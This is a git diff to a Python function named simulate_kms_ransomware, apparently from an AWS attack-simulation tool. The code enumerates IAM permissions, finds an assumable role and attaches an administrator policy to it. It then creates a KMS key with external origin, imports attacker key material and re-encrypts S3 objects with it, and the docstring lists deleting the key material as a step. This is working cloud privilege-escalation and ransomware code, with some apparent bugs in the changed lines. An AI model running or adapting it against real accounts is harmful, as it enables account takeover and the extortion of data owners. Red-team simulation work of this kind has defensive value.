@@ -12,7 +12,7 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
 from enumeration import enumerate_services
 from logger import get_logger
-from attach_role_policy import get_role_creds
+from attach_role_policy import get_role_creds, attach_administrator_policy
 
 logger = get_logger("s3_kms_encryption")
 
@@ -26,53 +26,21 @@ def simulate_kms_ransomware() -> None | bool:
     5. delete the key material
     """
 
-    # Enumerate few storage class
-    available_clients = enumerate_services(
-        action_confirmation_only=False,
-        actions_list={
-            "s3": [
-                "s3:PutObject",
-                "s3:GetObject"
-            ],
-            "kms": [
-				"kms:CreateKey",
-				"kms:GetParametersForImport",
-				"kms:ImportKeyMaterial",
-				"kms:ReplicateKey"
-			]
-        }
-    )
-
-    # if no user/role does not have KMS permissions
-    # check if AttackRolePolicy has been given to the role
-    # if yes, elevate the privileges
-    if not available_clients.get("kms", False):
-        # get attacker's role arn
-        iam_resp = enumerate_services(
-            action_confirmation_only=False,
-            actions_list={
-                "iam": [
-                    "iam:AttachRolePolicy"
-                ]
-            }
-        )
-        has_attach_role_policy = iam_resp.get("iam", False)
-        if not has_attach_role_policy:
-            logger.error("You do not have permission to attach policies to the role")
-            return False
-        
-        # hardcoding it as of now; remove it later
-        role_arn="arn:aws:iam::104266513052:role/mayatrail-role-9d85e54"
-        role_creds = get_role_creds(role_arn)
-        # update the role_creds in system env
-        for key, item in role_creds.items():
-            os.environ.update({key: str(item)})
-        
-        # Re-enumerate with elevated privileges
+    # Enumerate few storage class and KMS service for encryption
+    try:
         available_clients = enumerate_services(
             action_confirmation_only=False,
             actions_list={
-                "s3": ["s3:PutObject", "s3:GetObject"],
+                "s3": [
+                    "s3:PutObject",
+                    "s3:GetObject"
+                ],
+                "ec2": [
+                    "ec2:DescribeVolumes",
+                    "ec2:CreateSnapshot",
+                    "ec2:CopySnapshot",
+                    "ec2:DeleteSnapshot"
+                ],
                 "kms": [
                     "kms:CreateKey",
                     "kms:GetParametersForImport",
@@ -81,15 +49,61 @@ def simulate_kms_ransomware() -> None | bool:
                 ]
             }
         )
-    
-    kms_client = available_clients.get("kms")
-    s3_client = available_clients.get("s3")
-    
-    if not kms_client:
-        logger.error("KMS client not available even after privilege escalation")
+
+        # if no user/role does not have KMS permissions
+        # check if AttachRolePolicy has been given to any role
+        # if yes, elevate the privileges
+        if not available_clients.get("kms", False):
+            # Check if you have any juicy permissions such as AttachRolePolicy
+            iam_resp = enumerate_services(
+                action_confirmation_only=False,
+                actions_list={
+                    "iam": [
+                        "iam:AttachRolePolicy"
+                    ]
+                }
+            )
+            has_attach_role_policy = iam_resp.get("iam", False)
+            if not has_attach_role_policy:
+                logger.error("You do not have permission to attach policies to the role")
+                return False
+        
+            # check which role can this user assume
+            # sometimes the role might have good things to play with
+            iam_client = boto3.client("iam")
+            paginator = iam_client.get_paginator("list_roles")
+            roles_list = []
+            for each_page in paginator.paginate():
+                roles_list.extend(each_page.get("Roles"))
+            
+            logger.info("Available roles:")
+            for each_role in roles_list:
+                logger.info(f"Rolename: {each_role.get("RoleName")}, RoleArn: {each_role.get("Arn")}")
+                can_assume_role = enumerate_services(False, {"sts": ["sts:AssumeRole"]}, None, each_role.get("Arn"))
+                if can_assume_role.get("sts"):
+                    logger.info(f"User can assume role named: {each_role.get("RoleName")}")
+                    break
+            
+            # check if role has a permission to "attachrolepolicy"
+            iam_client_resp = enumerate_services(False, {"iam": ["iam:AttachRolePolicy"]}, None, each_role.get("Arn"))
+            if not iam_client_resp:
+                logger.info(f"Role {each_role.get("RoleName")} does not have permission called \"iam:AttachRolePolicy\"")
+            
+            role_creds = get_role_creds(each_role.get("Arn"))
+            for key, value in role_creds.items():
+                os.environ.update({key: value})
+            logger.info(f"Role {each_role.get("RoleName")} creds got updated")
+
+            attach_administrator_policy(each_role.get("RoleName"))
+    except Exception as err:
+        logger.error("Something went wrong during enumeration of services")
         return False
     
+    kms_client = boto3.client("kms")
     # external KMS key (with EXTERNAL origin for importing key material)
+    # manually created KMS key automatically adds the key material to it.
+    # this way, we can create a key without adding key material to it and then
+    # import our key material. 
     logger.info("Creating external KMS key with EXTERNAL origin...")
     try:
         key_response = kms_client.create_key(
@@ -158,7 +172,7 @@ def simulate_kms_ransomware() -> None | bool:
     
     # encrypt S3 bucket objects using the attacker's key
     logger.info("Encrypting S3 bucket with attacker-controlled key...")
-    target_bucket = os.environ.get("TARGET_BUCKET", "mayatrail-test-bucket")
+    target_bucket = "mayatrail-step1-bucket"
     
     try:
         s3_resource = boto3.resource("s3", region_name="ap-south-1")
@@ -168,7 +182,7 @@ def simulate_kms_ransomware() -> None | bool:
         for obj in bucket.objects.all():
             copy_source = {"Bucket": target_bucket, "Key": obj.key}
             
-            s3_client.copy_object(
+            s3_resource.copy_object(
                 Bucket=target_bucket,
                 Key=obj.key,
                 CopySource=copy_source,
